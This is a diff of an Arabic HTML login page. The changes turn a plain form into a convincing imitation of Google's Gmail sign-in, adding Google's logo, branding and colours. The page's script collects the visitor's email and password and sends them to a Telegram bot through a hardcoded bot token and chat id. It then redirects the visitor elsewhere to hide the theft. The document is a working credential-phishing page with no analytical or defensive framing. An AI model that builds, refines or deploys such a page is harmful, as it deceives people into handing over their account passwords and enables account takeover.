@@ -1,34 +1,45 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج تسجيل الدخول</title>
+  <title>تسجيل الدخول - Google</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: 'Tahoma', sans-serif;
+      margin: 0;
+      background: #f2f2f2;
+      font-family: 'Roboto', 'Tahoma', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
-      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
-      background-size: cover;
     }
 
     .form-container {
-      background: rgba(255, 255, 255, 0.92);
-      padding: 30px 25px;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-      width: 320px;
+      background: #fff;
+      width: 360px;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
       text-align: right;
     }
 
+    .form-container img {
+      display: block;
+      margin: 0 auto 20px;
+      height: 40px;
+    }
+
     h2 {
+      font-size: 24px;
+      margin: 0 0 10px;
+      color: #202124;
+    }
+
+    p {
+      font-size: 14px;
+      color: #5f6368;
       margin-bottom: 20px;
-      color: #333;
-      text-align: center;
     }
 
     .input-group {
@@ -36,72 +47,58 @@
       margin-bottom: 20px;
     }
 
-    .input-group input {
+    input {
       width: 100%;
-      padding: 10px 0 8px 0;
+      padding: 12px 10px;
       font-size: 16px;
-      border: none;
-      border-bottom: 2px solid #ccc;
-      background: transparent;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
       outline: none;
     }
 
-    .input-group label {
-      position: absolute;
-      right: 0;
-      top: 10px;
-      color: #777;
-      font-size: 16px;
-      pointer-events: none;
-      transition: 0.2s ease all;
-    }
-
-    .input-group input:focus {
-      border-bottom: 2px solid #1a73e8;
-    }
-
-    .input-group input:focus + label,
-    .input-group input:not(:placeholder-shown) + label {
-      top: -10px;
-      font-size: 12px;
-      color: #1a73e8;
-    }
-
-    .show-pass {
-      margin-top: -10px;
-      margin-bottom: 10px;
-      font-size: 14px;
-      color: #333;
+    input:focus {
+      border: 2px solid #1a73e8;
     }
 
     button {
       background-color: #1a73e8;
       color: white;
-      padding: 12px;
       border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
+      padding: 10px;
+      font-size: 15px;
+      border-radius: 4px;
       width: 100%;
+      cursor: pointer;
       margin-top: 10px;
     }
 
+    .link {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 13px;
+      display: block;
+      margin-top: 12px;
+    }
+
     .status {
-      margin-top: 15px;
-      color: #555;
-      font-size: 14px;
+      margin-top: 12px;
+      font-size: 13px;
+      color: #d93025;
       text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="form-container" id="formBox">
-    <h2>سجيل الدخول</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+    <h2>تسجيل الدخول</h2>
+    <p>انتقل إلى Gmail</p>
     <div class="input-group">
-      <input type="email" id="email" placeholder=" " required>
-      <label for="email">البريد الإلكتروني أو الهاتف</label>
+      <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
     </div>
+    <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
     <button onclick="goToPassword()">التالي</button>
+    <a class="link" href="#">استخدام حساب آخر</a>
     <div class="status" id="status"></div>
   </div>
 
@@ -109,28 +106,22 @@
     function goToPassword() {
       const email = document.getElementById("email").value.trim();
       if (!email) {
-        document.getElementById("status").textContent = "يرجى إدخال البريد.";
+        document.getElementById("status").textContent = "يرجى إدخال البريد أو الهاتف.";
         return;
       }
 
-      // تعديل المحتوى لصفحة كلمة المرور
       document.getElementById("formBox").innerHTML = `
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
         <h2>مرحبًا ${email}</h2>
+        <p>أدخل كلمة المرور لحسابك</p>
         <div class="input-group">
-          <input type="password" id="password" placeholder=" " required>
-          <label for="password">أدخل كلمة المرور</label>
+          <input type="password" id="password" placeholder="كلمة المرور">
         </div>
-        <div class="show-pass">
-          <input type="checkbox" id="showPass" onclick="togglePassword()"> عرض كلمة المرور
-        </div>
+        <a class="link" href="#">هل نسيت كلمة المرور؟</a>
         <button onclick="sendData('${email}')">تسجيل الدخول</button>
+        <a class="link" href="#">استخدام حساب آخر</a>
         <div class="status" id="status"></div>
       `;
-    }
-
-    function togglePassword() {
-      const passInput = document.getElementById("password");
-      passInput.type = passInput.type === "password" ? "text" : "password";
     }
 
     function sendData(email) {
@@ -144,7 +135,7 @@
 
       statusEl.textContent = "جارٍ الإرسال...";
 
-      const message = `📥 بيانات تسجيل:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
+      const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
       const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
       const chat_id = "6894787120";
       const url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chat_id}&text=\${encodeURIComponent(message)}\`;
@@ -152,14 +143,14 @@
       fetch(url)
         .then(res => {
           if (!res.ok) throw new Error("فشل الاتصال");
-          statusEl.textContent = "✅ تم الإرسال بنجاح! يتم التحويل...";
+          statusEl.style.color = "#188038";
+          statusEl.textContent = "✅ تم الإرسال. يتم التحويل...";
           setTimeout(() => {
             window.location.href = "https://chat.openai.com";
           }, 1500);
         })
         .catch(err => {
           statusEl.textContent = "❌ فشل في الإرسال.";
-          console.error(err);
         });
     }
   </script>
